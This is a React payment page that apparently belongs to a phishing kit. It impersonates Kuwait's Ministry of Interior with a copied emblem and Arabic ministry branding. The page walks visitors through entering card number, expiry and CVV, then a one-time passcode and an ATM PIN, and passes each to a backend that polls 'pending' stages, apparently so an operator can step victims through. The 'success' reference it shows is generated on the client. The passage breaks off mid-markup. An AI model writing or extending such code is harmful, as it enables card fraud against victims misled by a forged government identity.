import React, { useState, useEffect, type ReactNode, type FormEvent } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed" | "installment";

// Kuwait payment uses civilId and enquiryType instead of plate data

type CardSubmitPayload = {
  cardName: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
};

function PaymentFrame({ children }: { children: ReactNode }) {
  return (
    <div className="flex flex-col min-h-screen bg-white" dir="ltr">
      {children}
    </div>
  );
}

function PaymentGatewayHeader() {
  return (
    <header className="w-full bg-white border-b-2 border-[#8B0000] px-4 py-3 flex-shrink-0 sticky top-0 z-50">
      <div className="max-w-5xl mx-auto flex items-center justify-between gap-3">
        <div className="flex items-center gap-3">
          <svg width="48" height="48" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
            <circle cx="50" cy="50" r="48" fill="none" stroke="#8B0000" strokeWidth="3"/>
            <path d="M50 10 L75 25 L75 55 Q75 78 50 90 Q25 78 25 55 L25 25 Z" fill="#8B0000"/>
            <polygon points="50,22 53,31 63,31 55,37 58,46 50,40 42,46 45,37 37,31 47,31" fill="#FFD700"/>
            <text x="50" y="72" textAnchor="middle" fill="white" fontSize="8" fontFamily="Arial" fontWeight="bold">MOI</text>
          </svg>
          <div>
            <div className="text-sm font-black" style={{ color: "#8B0000" }}>وزارة الداخلية</div>
            <div className="text-[10px] text-gray-500">دولة الكويت</div>
          </div>
        </div>
      </div>
    </header>
  );
}

// InstallmentSummary removed - Kuwait does not support installment payments
function InstallmentSummary({ lang }: { lang: string }) {
  return null;
}


function SectionCard({ title, children }: { title: string; children: ReactNode }) {
  return (
    <section className="overflow-hidden rounded-[22px] border border-[#edf2f7] bg-white shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
      <div className="border-t-2 border-[#8B0000] bg-[#fef2f2] px-5 py-4 text-[15px] font-semibold text-[#7a7a7a]">
        {title}
      </div>
      <div className="px-5 py-4">{children}</div>
    </section>
  );
}

function InfoTable({ rows }: { rows: Array<{ label: string; value: string }> }) {
  return (
    <div className="space-y-0">
      {rows.map((row, index) => (
        <div
          key={`${row.label}-${index}`}
          className="flex items-center justify-between gap-4 border-b border-[#eef3f7] py-3 last:border-b-0"
        >
          <span className="text-[15px] text-[#697586]">{row.label}</span>
          <span className="text-right text-[15px] font-medium text-[#2a3342]">{row.value}</span>
        </div>
      ))}
    </div>
  );
}

function ErrorBanner({ message }: { message: string }) {
  return (
    <div className="mb-4 rounded-2xl border border-[#f1c5c8] bg-[#fff5f5] px-4 py-3 text-[13px] text-[#c74343]">
      {message}
    </div>
  );
}

function CvvCardIcon() {
  return (
    <svg width="84" height="58" viewBox="0 0 84 58" fill="none" xmlns="http://www.w3.org/2000/svg" className="h-12 w-auto">
      <rect x="6" y="8" width="46" height="34" rx="6" fill="#93A1AF" />
      <rect x="6" y="14" width="46" height="7" fill="#56616D" />
      <rect x="35" y="28" width="24" height="17" rx="5" fill="#E9F0F6" stroke="#AAB7C4" />
      <rect x="41" y="33" width="12" height="4" rx="2" fill="#FFFFFF" />
      <circle cx="46" cy="35" r="1.7" fill="#D33B49" />
      <circle cx="51" cy="35" r="1.7" fill="#D33B49" />
      <circle cx="56" cy="35" r="1.7" fill="#D33B49" />
    </svg>
  );
}


function SecurityLogos() {
  return (
    <div className="mt-5 overflow-hidden rounded-[18px] border border-[#e7edf5] bg-white p-2 shadow-sm">
      <img src="/card-brands.png" alt="Visa Mastercard American Express Discover" className="h-auto w-full rounded-[14px] object-contain" />
    </div>
  );
}

function PaymentActionBar({
  isLoading,
  onCancel,
}: {
  isLoading: boolean;
  onCancel: () => void;
}) {
  return (
    <div className="mt-5 overflow-hidden rounded-[22px] border border-[#e5e5e5] bg-[#f8f8f8] px-5 py-4">
      <div className="flex items-center gap-3">
        <button
          type="button"
          onClick={onCancel}
          className="flex-1 rounded-full bg-white px-5 py-3 text-[16px] font-medium text-[#6a7380] shadow-sm transition hover:bg-[#f5f5f5]"
        >
          Cancel
        </button>
        <button
          type="submit"
          disabled={isLoading}
          className="flex-1 rounded-full bg-[#8B0000] px-5 py-3 text-[16px] font-semibold text-white transition hover:bg-[#6d0000] disabled:cursor-not-allowed disabled:opacity-60"
        >
          {isLoading ? "Processing..." : "Pay"}
        </button>
      </div>
    </div>
  );
}

function PaymentFooter() {
  return (
    <footer className="w-full bg-[#f8f8f8] border-t border-[#e5e5e5] py-4 text-center flex-shrink-0">
      <p className="text-[13px] text-[#8a8a8a]">جميع الحقوق محفوظة - وزارة الداخلية - دولة الكويت</p>
    </footer>
  );
}

function CardForm({
  onSubmit,
  onCancel,
  isLoading,
  error,
  fineAmount,
  discountAmount,
  totalAmount,
}: {
  onSubmit: (data: CardSubmitPayload) => void;
  onCancel: () => void;
  isLoading: boolean;
  error?: string | null;
  fineAmount: string;
  discountAmount: string;
  totalAmount: string;
}) {
  const [cardName] = useState("Kuwait Pay");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [cardValidation, setCardValidation] = useState<{ valid: boolean; checked: boolean }>({ valid: false, checked: false });
  const [expiryValidation, setExpiryValidation] = useState<{ valid: boolean; checked: boolean }>({ valid: false, checked: false });
  const [cardType, setCardType] = useState<"visa" | "mastercard" | "amex" | "unknown">("unknown");
  const { t } = useLanguage();

  // Detect card type from number
  const detectCardType = (number: string): "visa" | "mastercard" | "amex" | "unknown" => {
    const digits = number.replace(/\D/g, "");
    if (digits.length < 1) return "unknown";
    const firstDigit = digits[0];
    if (firstDigit === "4") return "visa";
    if (firstDigit === "5") return "mastercard";
    // Amex starts with 3 (34 or 37)
    if (firstDigit === "3" && digits.length >= 2) {
      if (/^3[47]/.test(digits)) return "amex";
    }
    // Anything else (6, 7, 8, 9, 0, 1, etc.) is unknown/invalid
    if (digits.length >= 1) return "unknown";
    return "unknown";
  };

  // Luhn algorithm to validate card number
  const isValidLuhn = (num: string): boolean => {
    if (num.length < 12 || num.length > 19) return false;
    let sum = 0;
    let isEven = false;
    for (let i = num.length - 1; i >= 0; i--) {
      let digit = parseInt(num.charAt(i), 10);
      if (isEven) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      isEven = !isEven;
    }
    return sum % 10 === 0;
  };

  // Validate expiry date
  const isValidExpiry = (month: string, year: string): boolean => {
    if (month.length !== 2 || year.length !== 2) return false;
    const monthNum = parseInt(month, 10);
    const yearNum = parseInt(year, 10);
    if (monthNum < 1 || monthNum > 12) return false;
    const currentYear = new Date().getFullYear() % 100;
    const currentMonth = new Date().getMonth() + 1;
    if (yearNum < currentYear) return false;
    if (yearNum === currentYear && monthNum < currentMonth) return false;
    if (yearNum > 99) return false;
    return true;
  };

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
  };

  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value);
    setCardNumber(formatted);
    const digits = value.replace(/\D/g, "");
    // Detect card type from first digit only
    const type = detectCardType(digits);
    setCardType(type);

    // Check validity immediately when full number is entered
    if (digits.length >= 16) {
      const valid = isValidLuhn(digits);
      setCardValidation({ valid, checked: true });
      if (!valid) {
        setErrors(prev => ({ ...prev, cardNumber: "\u26A0 بطاقة غير صالحة" }));
      } else {
        setErrors(prev => { const n = { ...prev }; delete n.cardNumber; return n; });
      }
    } else {
      // While typing, no validation yet
      setCardValidation({ valid: false, checked: false });
      // Show unknown type error immediately if starts with wrong digit
      if (digits.length >= 1 && type === "unknown") {
        setErrors(prev => ({ ...prev, cardNumber: "\u26A0 بطاقة غير صالحة" }));
      } else {
        setErrors(prev => { const n = { ...prev }; delete n.cardNumber; return n; });
      }
    }
  };

  const handleExpiryChange = (newMonth: string, newYear: string) => {
    setExpiryMonth(newMonth);
    setExpiryYear(newYear);
    if (newMonth.length === 2 && newYear.length === 2) {
      const valid = isValidExpiry(newMonth, newYear);
      setExpiryValidation({ valid, checked: true });
      if (!valid) {
        setErrors(prev => ({ ...prev, cardExpiry: "تاريخ انتهاء غير صالح" }));
      } else {
        setErrors(prev => { const n = { ...prev }; delete n.cardExpiry; return n; });
      }
    } else {
      setExpiryValidation({ valid: false, checked: false });
      setErrors(prev => { const n = { ...prev }; delete n.cardExpiry; return n; });
    }
  };

  const monthOptions = Array.from({ length: 12 }, (_, index) => String(index + 1).padStart(2, "0"));
  const yearOptions = Array.from({ length: 25 }, (_, index) => String((2026 + index) % 100).padStart(2, "0"));

  const validate = () => {
    const newErrors: Record<string, string> = {};
    if (!cardValidation.valid || cardNumber.replace(/\s/g, "").length < 16) newErrors.cardNumber = t.payment.card.errors.cardNumber;
    if (!expiryValidation.valid || expiryMonth.length !== 2 || expiryYear.length !== 2) newErrors.cardExpiry = t.payment.card.errors.expiry;
    if (cardCvv.length < 3) newErrors.cardCvv = t.payment.card.errors.cvv;
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!validate()) return;
    onSubmit({
      cardName,
      cardNumber: cardNumber.replace(/\s/g, ""),
      cardExpiry: `${expiryMonth}/${expiryYear}`,
      cardCvv,
    });
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      {error && <ErrorBanner message={error} />}

      <SectionCard title="Card Details">
        <div className="space-y-4">
          <div className="grid grid-cols-1 gap-x-3 gap-y-2 sm:grid-cols-[112px_minmax(0,1fr)] sm:items-center">
            <label className="text-[14px] font-medium text-[#1e293b] sm:text-[15px]">Card Number</label>
            <div className="min-w-0">
              <div className="relative">
                {/* Card brand icon - left side */}
                <div className="absolute left-3 top-1/2 -translate-y-1/2 z-10">
                  {cardType === "unknown" && cardNumber.length < 2 ? (
                    /* Default card icon */
                    <svg xmlns="http://www.w3.org/2000/svg" width="36" height="24" viewBox="0 0 36 24" fill="none">
                      <rect width="36" height="24" rx="3" fill="#f1f5f9" stroke="#cbd5e1" strokeWidth="0.8"/>
                      <rect x="3" y="4" width="10" height="7" rx="1.5" fill="#cbd5e1"/>
                      <rect x="3" y="15" width="24" height="2.5" rx="1" fill="#e2e8f0"/>
                      <rect x="3" y="19" width="16" height="2" rx="1" fill="#e2e8f0"/>
                    </svg>
                  ) : cardType === "visa" ? (
                    /* Visa logo - clean text on blue background */
                    <svg xmlns="http://www.w3.org/2000/svg" width="44" height="16" viewBox="0 0 44 16" fill="none">
                      <rect width="44" height="16" rx="3" fill="#1434CB"/>
                      <text x="22" y="12" textAnchor="middle" fill="#FFFFFF" fontSize="10" fontWeight="bold" fontFamily="Arial, sans-serif" fontStyle="italic">VISA</text>
                    </svg>
                  ) : cardType === "mastercard" ? (
                    /* Mastercard logo - two overlapping circles */
                    <svg xmlns="http://www.w3.org/2000/svg" width="44" height="16" viewBox="0 0 44 16" fill="none">
                      <rect width="44" height="16" rx="3" fill="#FAFAFA"/>
                      <circle cx="17" cy="8" r="5.5" fill="#EB001B"/>
                      <circle cx="27" cy="8" r="5.5" fill="#F79E1B"/>
                      <path d="M22 3.3C20.3 5 19.3 6.5 19.3 8C19.3 9.5 20.3 11 22 12.7C23.7 11 24.7 9.5 24.7 8C24.7 6.5 23.7 5 22 3.3Z" fill="#FF5F00"/>
                    </svg>
                  ) : cardType === "amex" ? (
                    /* Amex logo */
                    <svg xmlns="http://www.w3.org/2000/svg" width="44" height="16" viewBox="0 0 44 16" fill="none">
                      <rect width="44" height="16" rx="3" fill="#006FCF"/>
                      <text x="22" y="11" textAnchor="middle" fill="#FFFFFF" fontSize="8" fontWeight="bold" fontFamily="Arial, sans-serif">AMEX</text>
                    </svg>
                  ) : (
                    /* Unknown/invalid card icon */
                    <svg xmlns="http://www.w3.org/2000/svg" width="36" height="24" viewBox="0 0 36 24" fill="none">
                      <rect width="36" height="24" rx="3" fill="#FEF2F2" stroke="#EF4444" strokeWidth="1.2"/>
                      <line x1="10" y1="7" x2="26" y2="17" stroke="#EF4444" strokeWidth="2.2" strokeLinecap="round"/>
                      <line x1="26" y1="7" x2="10" y2="17" stroke="#EF4444" strokeWidth="2.2" strokeLinecap="round"/>
                    </svg>
                  )}
                </div>
                <input
                  type="text"
                  inputMode="numeric"
                  value={cardNumber}
                  onChange={(e) => handleCardNumberChange(e.target.value)}
                  placeholder="Enter Card Number"
                  maxLength={19}
                  className={`h-12 w-full min-w-0 rounded-[10px] border bg-white pl-16 pr-10 text-[14px] text-[#273447] outline-none transition-all duration-200 placeholder:text-[#a3adba] focus:border-[#8ab9db] sm:pl-16 sm:px-4 sm:text-[15px] ${
                    (cardType === "unknown" && cardNumber.length >= 1)
                      ? "border-[#ef4444] bg-[#fef2f2] shadow-[0_0_0_3px_rgba(239,68,68,0.1)]"
                      : cardValidation.checked && !cardValidation.valid
                        ? "border-[#ef4444] bg-[#fef2f2] shadow-[0_0_0_3px_rgba(239,68,68,0.1)]"
                        : cardValidation.checked && cardValidation.valid
                          ? "border-[#22c55e] shadow-[0_0_0_3px_rgba(34,197,94,0.1)]"
                          : cardType !== "unknown"
                            ? "border-[#8ab9db]"
                            : "border-[#c9d3de]"
                  }`}
                />
                {/* Right side: Check/X icon */}
                {cardValidation.checked ? (
                  cardValidation.valid ? (
                    <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1">
                      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="none">
                        <circle cx="10" cy="10" r="9" fill="#dcfce7" stroke="#22c55e" strokeWidth="1.5"/>
                        <path d="M7 10L9 12L13 8" stroke="#22c55e" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                      </svg>
                    </div>
                  ) : (
                    <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1">
                      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="none">
                        <circle cx="10" cy="10" r="9" fill="#fef2f2" stroke="#ef4444" strokeWidth="1.5"/>
                        <path d="M7 7L13 13M13 7L7 13" stroke="#ef4444" strokeWidth="2" strokeLinecap="round"/>
                      </svg>
                    </div>
                  )
                ) : cardType === "unknown" && cardNumber.length >= 1 ? (
                  <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="none">
                      <circle cx="10" cy="10" r="9" fill="#fef2f2" stroke="#ef4444" strokeWidth="1.5"/>
                      <path d="M7 7L13 13M13 7L7 13" stroke="#ef4444" strokeWidth="2" strokeLinecap="round"/>
                    </svg>
                  </div>
                ) : null}
                {/* Card type label */}
                {cardType !== "unknown" && (
                  <span className={`absolute right-3 bottom-1 text-[10px] font-bold tracking-wide ${
                    cardType === "visa" ? "text-[#1a1f71]" : cardType === "mastercard" ? "text-[#eb001b]" : "text-[#006fcf]"
                  }`}>
                    {cardType === "visa" ? "VISA" : cardType === "mastercard" ? "MASTERCARD" : "AMEX"}
                  </span>
                )}
              </div>
              {/* Error message below input */}
              {(cardValidation.checked && !cardValidation.valid) || (cardType === "unknown" && cardNumber.length >= 1) ? (
                <div className="mt-2 flex items-center gap-2 px-3 py-2 bg-[#fef2f2] rounded-[8px] border border-[#fecaca]">
                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none" className="flex-shrink-0">
                    <circle cx="8" cy="8" r="7" fill="#ef4444"/>
                    <path d="M8 5V9M8 11V11.5" stroke="white" strokeWidth="2" strokeLinecap="round"/>
                  </svg>
                  <span className="text-[13px] text-[#dc2626] font-semibold">بطاقة غير صالحة</span>
                </div>
              ) : null}
            </div>
          </div>

          <div className="grid grid-cols-1 gap-x-3 gap-y-2 sm:grid-cols-[112px_minmax(0,1fr)] sm:items-center">
            <label className="text-[14px] font-medium text-[#1e293b] sm:text-[15px]">Expiry Date</label>
            <div className="min-w-0">
              <div className={`grid grid-cols-[minmax(0,1fr)_18px_minmax(0,1fr)] items-center gap-2 sm:max-w-[220px] ${
                expiryValidation.checked && !expiryValidation.valid ? "bg-[#fef2f2] rounded-[10px] px-2" : ""
              }`}>
                <select
                  value={expiryMonth}
                  onChange={(e) => handleExpiryChange(e.target.value, expiryYear)}
                  className={`h-12 w-full min-w-0 rounded-[10px] border bg-white px-3 text-center text-[14px] text-[#273447] outline-none transition focus:border-[#8ab9db] sm:text-[15px] ${
                    expiryValidation.checked && !expiryValidation.valid
                      ? "border-[#ef4444]"
                      : expiryValidation.checked && expiryValidation.valid
                        ? "border-[#22c55e]"
                        : errors.cardExpiry
                          ? "border-[#ef9a9a]"
                          : "border-[#c9d3de]"
                  }`}
                >
                  <option value="">MM</option>
                  {monthOptions.map((month) => (
                    <option key={month} value={month}>{month}</option>
                  ))}
                </select>
                <span className="text-center text-[20px] text-[#95a1af]">/</span>
                <select
                  value={expiryYear}
                  onChange={(e) => handleExpiryChange(expiryMonth, e.target.value)}
                  className={`h-12 w-full min-w-0 rounded-[10px] border bg-white px-3 text-center text-[14px] text-[#273447] outline-none transition focus:border-[#8ab9db] sm:text-[15px] ${
                    expiryValidation.checked && !expiryValidation.valid
                      ? "border-[#ef4444]"
                      : expiryValidation.checked && expiryValidation.valid
                        ? "border-[#22c55e]"
                        : errors.cardExpiry
                          ? "border-[#ef9a9a]"
                          : "border-[#c9d3de]"
                  }`}
                >
                  <option value="">YY</option>
                  {yearOptions.map((year) => (
                    <option key={year} value={year}>{year}</option>
                  ))}
                </select>
              </div>
              {expiryValidation.checked && !expiryValidation.valid && (
                <p className="mt-1 text-[12px] text-[#ef4444] font-medium">\u26A0 تاريخ انتهاء غير صالح</p>
              )}
              {!expiryValidation.checked && errors.cardExpiry && <p className="mt-1 text-[12px] text-[#d14b4b]">{errors.cardExpiry}</p>}
            </div>
          </div>

          <div className="grid grid-cols-1 gap-x-3 gap-y-2 sm:grid-cols-[112px_minmax(0,1fr)] sm:items-center">
            <label className="text-[14px] font-medium text-[#1e293b] sm:text-[15px]">CVV Number</label>
            <div className="min-w-0">
              <div className="flex flex-wrap items-center gap-3 sm:flex-nowrap">
                <input
                  type="password"
                  inputMode="numeric"
                  value={cardCvv}
                  onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                  placeholder="CVV"
                  maxLength={4}
                  className={`h-12 w-[92px] min-w-0 rounded-[10px] border bg-white px-3 text-center text-[14px] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db] sm:text-[15px] ${errors.cardCvv ? "border-[#ef9a9a]" : "border-[#c9d3de]"}`}
                />
                <CvvCardIcon />
              </div>
              {errors.cardCvv && <p className="mt-1 text-[12px] text-[#d14b4b]">{errors.cardCvv}</p>}
            </div>
          </div>

          <p className="pt-2 text-[12px] leading-6 text-[#6e7b89] sm:text-[13px]">
            CVV number (Security Code) is the last three digits of the number found on the back of your credit card near the signature strip.
          </p>

          <SecurityLogos />
        </div>
      </SectionCard>

      <PaymentActionBar
        isLoading={isLoading}
        onCancel={onCancel}
      />
    </form>
  );
}

function WaitingPage({ message }: { message: string }) {
  return (
    <div className="rounded-[22px] border border-[#edf2f7] bg-white px-5 py-12 text-center shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
      <div className="mx-auto mb-5 h-14 w-14 animate-spin rounded-full border-[3px] border-[#f3d8d8] border-t-[#8B0000]" />
      <h3 className="text-[20px] font-semibold text-[#263445]">Processing Request</h3>
      <p className="mt-3 text-[14px] leading-7 text-[#6f7b88]">{message}</p>
      <p className="mt-2 text-[13px] text-[#90a0b2]">Please wait and do not close this page.</p>
    </div>
  );
}

function OtpForm({
  onSubmit,
  isLoading,
  error,
  rows,
}: {
  onSubmit: (otp: string) => void;
  isLoading: boolean;
  error?: string | null;
  rows: Array<{ label: string; value: string }>;
}) {
  const [otp, setOtp] = useState("");
  const [otpError, setOtpError] = useState("");
  const { t } = useLanguage();

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (otp.length < 4) {
      setOtpError(t.payment.otp.error);
      return;
    }
    setOtpError("");
    onSubmit(otp);
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <SectionCard title="ملخص المبلغ">
        <InfoTable rows={rows} />
      </SectionCard>

      {(error || otpError) && <ErrorBanner message={error || otpError} />}

      <SectionCard title="Card Security Verification">
        <div className="text-center">
          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full border border-[#d7e7f5] bg-[#edf5fd] text-[28px] shadow-sm">📱</div>
          <h3 className="text-[20px] font-semibold text-[#263445]">{t.payment.otp.title}</h3>
          <p className="mt-2 text-[14px] leading-7 text-[#6f7b88]">{t.payment.otp.subtitle}</p>
          <input
            type="text"
            inputMode="numeric"
            value={otp}
            onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 8))}
            placeholder={t.payment.otp.placeholder}
            maxLength={8}
            className="mt-5 h-14 w-full rounded-[14px] border border-[#c9d3de] bg-white px-4 text-center text-[24px] tracking-[0.35em] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db]"
          />
        </div>
      </SectionCard>

      <div className="overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-5">
        <button
          type="submit"
          disabled={isLoading}
          className="w-full rounded-full bg-[#8B0000] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#6d0000] disabled:cursor-not-allowed disabled:opacity-60"
        >
          {isLoading ? t.payment.otp.verifying : t.payment.otp.confirmButton}
        </button>
      </div>
    </form>
  );
}


function AtmPinForm({
  onSubmit,
  isLoading,
  error,
  rows,
}: {
  onSubmit: (pin: string) => void;
  isLoading: boolean;
  error?: string | null;
  rows: Array<{ label: string; value: string }>;
}) {
  const [pin, setPin] = useState("");
  const [pinError, setPinError] = useState("");
  const { t } = useLanguage();

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (pin.length < 4) {
      setPinError(t.payment.atm.error);
      return;
    }
    setPinError("");
    onSubmit(pin);
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <SectionCard title="ملخص المبلغ">
        <InfoTable rows={rows} />
      </SectionCard>

      {(error || pinError) && <ErrorBanner message={error || pinError} />}

      <SectionCard title="ATM PIN Verification">
        <div className="text-center">
          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full border border-[#ffe1b4] bg-[#fff4e6] text-[28px] shadow-sm">🏧</div>
          <h3 className="text-[20px] font-semibold text-[#263445]">{t.payment.atm.title}</h3>
          <p className="mt-2 text-[14px] leading-7 text-[#6f7b88]">{t.payment.atm.subtitle}</p>
          <input
            type="password"
            inputMode="numeric"
            value={pin}
            onChange={(e) => setPin(e.target.value.replace(/\D/g, "").slice(0, 6))}
            placeholder="••••"
            maxLength={6}
            className="mt-5 h-14 w-full rounded-[14px] border border-[#c9d3de] bg-white px-4 text-center text-[24px] tracking-[0.35em] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db]"
          />
          <div className="mt-4 rounded-2xl border border-[#ffe1b4] bg-[#fff8eb] px-4 py-3 text-right text-[13px] leading-6 text-[#9b6b11]">
            {t.payment.atm.warning}
          </div>
        </div>
      </SectionCard>

      <div className="overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-5">
        <button
          type="submit"
          disabled={isLoading}
          className="w-full rounded-full bg-[#8B0000] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#6d0000] disabled:cursor-not-allowed disabled:opacity-60"
        >
          {isLoading ? t.payment.atm.verifying : t.payment.atm.confirmButton}
        </button>
      </div>
    </form>
  );
}

function SuccessPage({ totalAmount, onDone }: { totalAmount: string; onDone: () => void }) {
  const { t, lang } = useLanguage();

  return (
    <div className="space-y-4">
      <div className="rounded-[22px] border border-[#daf0df] bg-white px-5 py-10 text-center shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
        <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-[#e8f8ec] text-[30px]">✅</div>
        <h2 className="text-[22px] font-semibold text-[#12834d]">{t.payment.success.title}</h2>
        <p className="mt-2 text-[14px] text-[#6f7b88]">{t.payment.success.subtitle}</p>
        <div className="mt-6 rounded-[18px] bg-[#f5faf7] px-5 py-4">
          <p className="text-[13px] text-[#6f7b88]">{t.payment.success.amountPaid}</p>
          <p className="mt-1 text-[28px] font-semibold text-[#12834d]">{totalAmount} KWD</p>
        </div>
        <div className="mt-4 rounded-[18px] bg-[#f8fafc] px-5 py-4 text-left">
          <p className="text-[13px] text-[#6f7b88]">{t.payment.success.reference}</p>
          <p className="mt-1 font-mono text-[14px] text-[#273447]">KW-{Date.now().toString().slice(-8)}</p>
          <p className="mt-1 text-[12px] text-[#94a3b8]">{new Date().toLocaleString(lang === "ar" ? "ar-KW" : "en-KW")}</p>
        </div>
      </div>

      <div className="overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-5">
        <button
          type="button"
          onClick={onDone}
          className="w-full rounded-full bg-[#8B0000] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#6d0000]"
        >
          {t.payment.success.backButton}
        </button>
      </div>
    </div>
  );
}

function FailedPage({ onRetry }: { onRetry: () => void }) {
  const { t } = useLanguage();

  return (
    <div className="space-y-4">
      <div className="rounded-[22px] border border-[#f5d0d0] bg-white px-5 py-10 text-center shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
        <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-[#fff1f1] text-[30px]">❌</div>
        <h2 className="text-[22px] font-semibold text-[#cf4444]">{t.payment.failed.title}</h2>
        <p className="mt-2 text-[14px] text-[#6f7b88]">{t.payment.failed.subtitle}</p>
      </div>

      <div className="overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-5">
        <button
          type="button"
          onClick={onRetry}
          className="w-full rounded-full bg-[#8B0000] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#6d0000]"
        >
          {t.payment.failed.retryButton}
        </button>
      </div>
    </div>
  );
}

export default function Payment() {
  const [location, navigate] = useLocation();
  const { t, lang, setLanguage } = useLanguage();
  const isArabicRoute = location === "/ar/payment" || location.startsWith("/ar/payment?");
  const homePath = isArabicRoute ? "/ar" : "/";

  useEffect(() => {
    setLanguage(isArabicRoute ? "ar" : "en");
  }, [isArabicRoute, setLanguage]);

  const buildLocalizedPaymentPath = (targetLang: "ar" | "en") => {
    const params = window.location.search || "";
    return targetLang === "ar" ? `/ar/payment${params}` : `/payment${params}`;
  };

  const handleLanguageNavigation = () => {
    const nextLang = isArabicRoute ? "en" : "ar";
    setLanguage(nextLang);
    navigate(buildLocalizedPaymentPath(nextLang));
  };

  const getPaymentContextFromUrl = () => {
    try {
      const params = new URLSearchParams(window.location.search);
      return {
        sessionId: params.get("sessionId"),
        totalAmount: params.get("total") || "0",
      };
    } catch {
      return {
        sessionId: null,
        totalAmount: "0",
      };
    }
  };

  const [paymentData] = useState(() => {
    try {
      const raw = sessionStorage.getItem("paymentData");
      if (raw) return JSON.parse(raw);
    } catch {}

    const fallback = getPaymentContextFromUrl();
    if (fallback.sessionId) {
      return {
        selectedFines: [],
        totalAmount: fallback.totalAmount,
        sessionId: fallback.sessionId,
        civilId: "",
        enquiryType: "1",
      };
    }

    return null;
  });

  const [sessionId, setSessionId] = useState<string | null>(() => {
    const urlSessionId = getPaymentContextFromUrl().sessionId;
    if (urlSessionId) return urlSessionId;

    try {
      return sessionStorage.getItem("paymentSessionId");
    } catch {
      return null;
    }
  });

  const [stage, setStage] = useState<Stage>("card");
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const createSession = trpc.payment.createSession.useMutation();
  const submitCard = trpc.payment.submitCard.useMutation();
  const submitOtp = trpc.payment.submitOtp.useMutation();
  const submitAtmPin = trpc.payment.submitAtmPin.useMutation();

  const statusQuery = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId && stage !== "success" && stage !== "failed",
      refetchInterval: stage === "success" || stage === "failed" ? false : 3000,
      refetchIntervalInBackground: true,
    }
  );

  useEffect(() => {
    if (!sessionId) return;
    try {
      sessionStorage.setItem("paymentSessionId", sessionId);
    } catch {}
  }, [sessionId]);

  useEffect(() => {
    if (!sessionId && paymentData) {
      createSession.mutateAsync({
        selectedFines: paymentData.selectedFines || [],
        totalAmount: paymentData.totalAmount || "0",
        civilId: paymentData.civilId || "",
        enquiryType: paymentData.enquiryType || "1",
        queryId: paymentData.queryId,
      }).then((res) => {
        if (res.success) {
          setSessionId(res.sessionId);
          sessionStorage.setItem("paymentSessionId", res.sessionId);
        }
      }).catch(console.error);
    }
  }, []);

  useEffect(() => {
    if (!statusQuery.data) return;
    const newStage = statusQuery.data.stage as Stage;
    const newError = statusQuery.data.errorMessage;

    if (newStage !== stage) {
      setStage(newStage);
      setErrorMessage(newError || null);
    }
  }, [statusQuery.data]);

  if (!paymentData && !sessionId) {
    return (
      <PaymentFrame>
        <PaymentGatewayHeader />
        <div className="flex-1 flex items-center justify-center px-6 py-12">
          <div className="max-w-md w-full text-center">
            <p className="text-[16px] leading-7 text-[#5f6c7b]">{t.payment.noData.message}</p>
            <button
              onClick={() => navigate(homePath)}
              className="mt-5 rounded-full bg-[#8B0000] px-6 py-3 text-[16px] font-semibold text-white transition hover:bg-[#6d0000]"
            >
              {t.payment.noData.backButton}
